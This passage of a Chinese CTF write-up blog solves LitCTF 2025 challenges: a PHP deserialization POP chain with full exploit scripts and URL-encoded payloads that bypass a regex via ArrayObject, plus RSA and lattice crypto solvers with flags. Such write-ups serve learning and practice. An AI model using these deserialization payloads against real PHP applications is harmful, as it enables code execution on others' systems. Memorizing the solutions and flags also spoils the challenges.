+<h3 id="君の名はwp"><a class="markdownIt-Anchor" href="#君の名はwp"></a> 君の名はwp</h3>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个题当时比赛的时候没多少时间了，也没仔细看，但仔细一看发现确实不会</p>
+<p>利用点很容易找到</p>
+<p>就是<strong>Taki::__call</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</span><br></pre></td></tr></table></figure>
+<p>可以简化一下来看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(new A(B))-&gt;&#123;C&#125;();</span><br><span class="line">//A=$args[0]</span><br><span class="line">//B=$args[1]</span><br><span class="line">//C=$this-&gt;magic</span><br></pre></td></tr></table></figure>
+<p>new A(B)是实例了一个类</p>
+<p>(new A(B))-&gt;{C}();调用这个类的一个方法，但这个方法的参数只能为空，可以尝试调用简单的phpinfo()等无参函数。</p>
+<p>再来看<code>create_function(&quot;&quot;, 'die(/readflag);');</code></p>
+<p>用create_function创建了一个匿名函数，直接执行了/readflag，也就是说只要调用这个匿名函数就能输出flag，于是我们的思路就清楚了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">找到一个可以调用匿名函数的原生类</span><br><span class="line"></span><br><span class="line">找到匿名函数的名字</span><br></pre></td></tr></table></figure>
+<p>直接搜发现<strong>ReflectionFunction的invoke方法可以调用函数</strong></p>
+<p>基本用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 定义一个简单的函数</span><br><span class="line">function greet($name) &#123;</span><br><span class="line">    return &quot;Hello, &quot; . $name . &quot;!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 创建 ReflectionFunction 实例</span><br><span class="line">$reflection = new ReflectionFunction(&#x27;greet&#x27;);</span><br><span class="line"></span><br><span class="line">// 使用 invoke 调用函数</span><br><span class="line">$result = $reflection-&gt;invoke(&#x27;World&#x27;);</span><br><span class="line"></span><br><span class="line">echo $result; // 输出: Hello, World!</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>ReflectionFunction的参数就是要调用的函数名，invoke的参数就是被调函数的参数，这个用法和我们的利用思路刚好吻合，invoke不用传参数。</p>
+<p>我们来调用的话就是**(new ReflectionFunction(匿名函数名称))-&gt;invoke()**</p>
+<p>现在只需要找到匿名函数名称</p>
+<p>匿名函数的函数名是会改变的，在web页面中打开php文件，每刷新一次函数名的数字就会加一，<code>\000lambda_1</code>只是第一次访问题目环境时匿名函数的名字，所以最好是重新开启一个环境来提交payload，这样我们的匿名函数就是<code>\000lambda_1</code></p>
+<h4 id="构造pop链"><a class="markdownIt-Anchor" href="#构造pop链"></a> <strong>构造pop链</strong></h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Taki::__unserialize-&gt;Mitsuha::__invoke-&gt;KatawareDoki::toString-&gt;Taki::__call</span><br></pre></td></tr></table></figure>
+<p>这里我们通过<code>__toStringh</code>触发__call时</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        ($this-&gt;soul)-&gt;flag($this-&gt;kuchikamizake,$this-&gt;name);</span><br><span class="line">        return &quot;call error!no flag!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __call($func,$args)&#123;</span><br><span class="line">        (new $args[0]($args[1]))-&gt;&#123;$this-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p><code>__call</code>里面的参数$func是不存在的函数名，即__toString里面的flag函数</p>
+<p>而参数$args即flag函数传的参数</p>
+<p><code>$args[0]</code>是<code>$this-&gt;kuchikamizake</code>，<code>$args[1]</code>是<code>$this-&gt;name</code></p>
+<h4 id="绕过preg_matchoadi-litctf2025"><a class="markdownIt-Anchor" href="#绕过preg_matchoadi-litctf2025"></a> <strong><code>绕过preg_match(&quot;/^[Oa]:[\d]+/i&quot;, $Litctf2025)</code></strong></h4>
+<p>正则表达式<code>/^[Oa]:[\d]+/i</code>检查序列化字符串是否以对象(<code>O:</code>)或数组(<code>a:</code>)开头，后跟数字</p>
+<p>根据提示把O变成C，因此我们需要<strong>用一个类来对链子进行包装，然后开头的O就会被自动转换为C</strong></p>
+<p><strong>例题：2023愚人杯3rd [easy_php]</strong>：[愚人杯3rd [easy_php] - Boogiepop Doesn’t Laugh](<a target="_blank" rel="noopener" href="https://boogipop.com/2023/04/02/%E6%84%9A%E4%BA%BA%E6%9D%AF3rd">https://boogipop.com/2023/04/02/愚人杯3rd</a> [easy_php]/)</p>
+<p>用内置类<strong>ArrayObject</strong>，这个内置类序列化结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$arr=array(&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2);</span><br><span class="line">$ao=new ArrayObject($arr);</span><br><span class="line">echo serialize($ao);</span><br></pre></td></tr></table></figure>
+<p><img src="../images/20250527153135735.png" alt="image-20250527153135735" /></p>
+<p>可以看到是C开头的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">绕过正则的化</span><br><span class="line">这里用一个类来对链子进行包装，然后开头的O就会被自动转换为C</span><br><span class="line">可以使用的类有很多：</span><br><span class="line"></span><br><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure>
+<h4 id="完整exp"><a class="markdownIt-Anchor" href="#完整exp"></a> 完整EXP</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Taki</span><br><span class="line">&#123;</span><br><span class="line">    public $musubi;</span><br><span class="line">    public $magic = &quot;invoke&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Mitsuha</span><br><span class="line">&#123;</span><br><span class="line">    public $memory;</span><br><span class="line">    public $thread;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class KatawareDoki</span><br><span class="line">&#123;</span><br><span class="line">    public $soul;</span><br><span class="line">    public $kuchikamizake = &quot;ReflectionFunction&quot;;</span><br><span class="line">    public $name = &quot;\000lambda_1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Taki();</span><br><span class="line">$b = new Mitsuha();</span><br><span class="line">$c = new KatawareDoki();</span><br><span class="line"></span><br><span class="line">$a-&gt;musubi = $b;		// 1.把对象当成函数调用，触发__invoke()</span><br><span class="line">$b-&gt;thread = $c;		// 2. 把对象作为字符串使用，触发__toString()</span><br><span class="line">$c-&gt;soul = $a;			// 3. 调用不存在的方法，触发__call()</span><br><span class="line"></span><br><span class="line">$arr=array(&quot;evil&quot;=&gt;$a);</span><br><span class="line">$d=new ArrayObject($arr);</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line"></span><br><span class="line">//C%3A11%3A%22ArrayObject%22%3A244%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3BO%3A7%3A%22Mitsuha%22%3A2%3A%7Bs%3A6%3A%22memory%22%3BN%3Bs%3A6%3A%22thread%22%3BO%3A12%3A%22KatawareDoki%22%3A3%3A%7Bs%3A4%3A%22soul%22%3Br%3A4%3Bs%3A13%3A%22kuchikamizake%22%3Bs%3A18%3A%22ReflectionFunction%22%3Bs%3A4%3A%22name%22%3Bs%3A9%3A%22%00lambda_1%22%3B%7D%7Ds%3A5%3A%22magic%22%3Bs%3A6%3A%22invoke%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D</span><br></pre></td></tr></table></figure>
+<p>如果不对，直接将\00lambda_%d进行爆破</p>
+<h4 id="非预期"><a class="markdownIt-Anchor" href="#非预期"></a> 非预期</h4>
+<p>直接在<code>return ($this-&gt;musubi)();</code>处调用匿名函数</p>
+<p><strong>exp:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Taki</span><br><span class="line">&#123;</span><br><span class="line">    public $musubi = &quot;\000lambda_1&quot;;</span><br><span class="line">    public $magic = &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$a = new Taki();</span><br><span class="line"></span><br><span class="line">$arr=array(&quot;evil&quot;=&gt;$a);</span><br><span class="line">$d=new ArrayObject($arr);</span><br><span class="line">echo urlencode(serialize($d));</span><br><span class="line"></span><br><span class="line">//Litctf2025=C%3A11%3A%22ArrayObject%22%3A95%3A%7Bx%3Ai%3A0%3Ba%3A1%3A%7Bs%3A4%3A%22evil%22%3BO%3A4%3A%22Taki%22%3A2%3A%7Bs%3A6%3A%22musubi%22%3Bs%3A9%3A%22%00lambda_1%22%3Bs%3A5%3A%22magic%22%3Bs%3A0%3A%22%22%3B%7D%7D%3Bm%3Aa%3A0%3A%7B%7D%7D</span><br></pre></td></tr></table></figure>
+<h2 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h2>
+<h3 id="math"><a class="markdownIt-Anchor" href="#math"></a> math</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">from enc import flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">e = 65537</span><br><span class="line">p,q = getPrime(1024),getPrime(1024)</span><br><span class="line">n = p*q</span><br><span class="line">noise = getPrime(40)</span><br><span class="line">tmp1 = noise*p+noise*q</span><br><span class="line">tmp2 = noise*noise</span><br><span class="line">hint = p*q+tmp1+tmp2</span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">print(f&quot;n = &#123;n&#125;&quot;)</span><br><span class="line">print(f&quot;e = &#123;e&#125;&quot;)</span><br><span class="line">print(f&quot;c = &#123;c&#125;&quot;)</span><br><span class="line">print(f&quot;hint = &#123;hint&#125;&quot;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">n = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141</span><br><span class="line">e = 65537</span><br><span class="line">c = 1443781085228809103260687286964643829663045712724558803386592638665188285978095387180863161962724216167963654290035919557593637853286347618612161170407578261345832596144085802169614820425769327958192208423842665197938979924635782828703591528369967294598450115818251812197323674041438116930949452107918727347915177319686431081596379288639254670818653338903424232605790442382455868513646425376462921686391652158186913416425784854067607352211587156772930311563002832095834548323381414409747899386887578746299577314595641345032692386684834362470575165392266454078129135668153486829723593489194729482511596288603515252196</span><br><span class="line">hint = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565315879035806034866363781260326863226820493638303543900551786806420978685834963920605455531498816171226961859405498825422799670404315599803610007692517859020686506546933013150302023167306580068646104886750772590407299332549746317286972954245335810093049085813683948329319499796034424103981702702886662008367017860043529164</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<p>题目给了三个式子、</p>
+<p><img src="../images/20250527170322274.png" alt="image-20250527170322274" /></p>
+<p>我们对等式进行变形</p>
+<p><img src="../images/20250527170338861.png" alt="image-20250527170338861" /></p>
+<p>那么hint-n就是两个数之积了，同时noise很小，yafu在有限的时间内可以分解，但是factordb上存有已有的分解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint-n=249654310878891990875408514515597700737540960565379370987831819192071835435830681610138021444651529451341366765237520877622415164971332395068907509260292657023322432546857358551754112936426750312119591980443637876760333676491029037290243486555246692136987872068422089358879417987568129415191205220265687614278762617516023</span><br></pre></td></tr></table></figure>
+<p>在factordb上分解hint-n</p>
+<p>得到</p>
+<p><img src="../images/20250527170613304.png" alt="image-20250527170613304" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">19</span><br><span class="line">942430120937</span><br><span class="line">13942360585323048470909846656964572704513299405546046811010328770033198426421576349568926279384369628072261252513038693891801832793244205614823946991510903118232135334563566099595180800155562142673080500174590397281272043792295225345391996291640336108556360227747859478557651612788250116887738800942290148741</span><br></pre></td></tr></table></figure>
+<p>第二个就是noise，第三个就是p+q，直接解方程得到pq，然后rsa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># python3.11.4</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">n = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565066224724927142875488372745811265526082952677738164529563954987228906850399133238995317510054164641775620492640261304545177255239344267408541100183257566363663184114386155791750269054370153318333985294770328952530538998873255288249682710758780563400912097941615526239960620378046855974566511497666396320752739097426013141</span><br><span class="line">e = 65537</span><br><span class="line">c = 1443781085228809103260687286964643829663045712724558803386592638665188285978095387180863161962724216167963654290035919557593637853286347618612161170407578261345832596144085802169614820425769327958192208423842665197938979924635782828703591528369967294598450115818251812197323674041438116930949452107918727347915177319686431081596379288639254670818653338903424232605790442382455868513646425376462921686391652158186913416425784854067607352211587156772930311563002832095834548323381414409747899386887578746299577314595641345032692386684834362470575165392266454078129135668153486829723593489194729482511596288603515252196</span><br><span class="line">hint = 17532490684844499573962335739488728447047570856216948961588440767955512955473651897333925229174151614695264324340730480776786566348862857891246670588649327068340567882240999607182345833441113636475093894425780004013793034622954182148283517822177334733794951622433597634369648913113258689335969565315879035806034866363781260326863226820493638303543900551786806420978685834963920605455531498816171226961859405498825422799670404315599803610007692517859020686506546933013150302023167306580068646104886750772590407299332549746317286972954245335810093049085813683948329319499796034424103981702702886662008367017860043529164</span><br><span class="line"></span><br><span class="line"># print(hint - n)</span><br><span class="line">noise = 942430120937</span><br><span class="line">p_plus_q = (hint - n - noise**2) // noise</span><br><span class="line">phi = n + 1 - p_plus_q</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"># LitCTF&#123;db6f52b9265971910b306754b9df8b76&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="baby"><a class="markdownIt-Anchor" href="#baby"></a> baby</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from enc import flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">g = getPrime(512)</span><br><span class="line">t = getPrime(150)</span><br><span class="line">data = (t * gmpy2.invert(m, g)) % g</span><br><span class="line">print(f&#x27;g = &#123;g&#125;&#x27;)</span><br><span class="line">print(f&#x27;data = &#123;data&#125;&#x27;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">g = 7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547</span><br><span class="line">data = 2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
+<p>由题意知</p>
+<p><img src="../images/20250527171539298.png" alt="image-20250527171539298" /></p>
+<p>所以</p>
+<p><img src="../images/20250527171555075.png" alt="image-20250527171555075" /></p>
+<p>即</p>
+<p><img src="../images/20250527171608627.png" alt="image-20250527171608627" /></p>
+<p>造格</p>
+<p><img src="../images/20250527171626049.png" alt="image-20250527171626049" /></p>
+<p>做一点参数调整即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># sage10.6</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">g = 7835965640896798834809247993719156202474265737048568647376673642017466116106914666363462292416077666356578469725971587858259708356557157689066968453881547</span><br><span class="line">data = 2966297990428234518470018601566644093790837230283136733660201036837070852272380968379055636436886428180671888655884680666354402224746495312632530221228498</span><br><span class="line">i = 128</span><br><span class="line">Ge = Matrix(ZZ,[</span><br><span class="line">    [1,data],</span><br><span class="line">    [0,g]</span><br><span class="line">])</span><br><span class="line">Ge[:,-1] *= 2^i</span><br><span class="line">m,t = Ge.LLL()[0]</span><br><span class="line">m,t = abs(m),abs(t) // 2^i</span><br><span class="line">if t.bit_length() == 150:</span><br><span class="line">    print(long_to_bytes(m))</span><br><span class="line"># LitCTF&#123;56008a819331c9f3608a718327b7e6ce&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%97%B6%E9%97%B4%E6%88%B3%E7%88%86%E7%A0%B4/" rel="tag">时间戳爆破</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="[NPUCTF2020]验证🐎" class="lazyload">
+          
+        
+        <a href="/2025/05/26/%5BNPUCTF2020%5D%E9%AA%8C%E8%AF%81%F0%9F%90%8E/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [NPUCTF2020]验证🐎
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1737907114de8a.jpg" data-sizes="auto" alt="[GFCTF 2021]ez_calc" class="lazyload">
+        
+      
+      <a href="/2025/05/23/%5BGFCTF%202021%5Dez_calc/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [GFCTF 2021]ez_calc
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
